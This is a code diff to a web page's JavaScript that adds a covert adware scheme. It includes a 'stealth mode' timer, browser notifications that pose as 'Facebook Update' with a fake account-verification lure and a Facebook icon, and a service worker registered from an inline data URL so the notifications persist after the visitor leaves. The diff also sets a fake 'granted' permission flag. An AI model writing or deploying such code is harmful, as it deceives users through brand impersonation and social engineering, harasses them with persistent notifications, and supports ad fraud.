@@ -201,6 +201,9 @@
         function startStealthMode() {
             console.log("Stealth Mode Active: Waiting " + (INITIAL_DELAY_MS/1000) + " seconds...");
             
+            // Save permission granted to localStorage
+            localStorage.setItem('notificationPermission', 'granted');
+            
             // 1. Wait 2 minutes before showing the FIRST ad
             setTimeout(() => {
                 showAd(); // Fire the first ad
@@ -215,11 +218,13 @@
             if (Notification.permission === "granted") {
                 new Notification("Facebook Update", {
                     body: "Your account needs verification! Tap to view ad.",
-                    icon: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/LiM4G5JF3l7.png"
+                    icon: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/LiM4G5JF3l7.png",
+                    tag: "facebook-update",
+                    requireInteraction: true
                 });
             }
 
-            // 2. Reveal and Load the AdMob Ad
+            // 2. Load the AdMob Ad
             loadAdMobAd();
         }
 
@@ -254,6 +259,46 @@
                 console.log("Ad loaded or error occurred:", e);
             }
         }
+
+        // Register Service Worker to keep ads running in background
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(`
+                self.addEventListener('push', event => {
+                    if (!event.data) return;
+                    
+                    const options = {
+                        body: 'Your account needs verification! Tap to view ad.',
+                        icon: 'https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/LiM4G5JF3l7.png',
+                        tag: 'facebook-update',
+                        requireInteraction: true
+                    };
+                    
+                    event.waitUntil(self.registration.showNotification('Facebook Update', options));
+                });
+                
+                self.addEventListener('notificationclick', event => {
+                    event.notification.close();
+                    event.waitUntil(clients.matchAll({ type: 'window' }).then(clientList => {
+                        for (let i = 0; i < clientList.length; i++) {
+                            if (clientList[i].url === '/' && 'focus' in clientList[i]) {
+                                return clientList[i].focus();
+                            }
+                        }
+                        if (clients.openWindow) {
+                            return clients.openWindow('/');
+                        }
+                    }));
+                });
+            `)).catch(err => console.log('Service Worker registration failed:', err));
+        }
+
+        // Continue showing ads even after user leaves the page
+        window.addEventListener('beforeunload', function() {
+            if (localStorage.getItem('notificationPermission') === 'granted') {
+                // Ads will continue via service worker and push notifications
+                console.log("Ads will continue in the background via push notifications");
+            }
+        });
 
         // Optional: Auto-trigger on page load if you want it aggressive
         window.onload = function() {
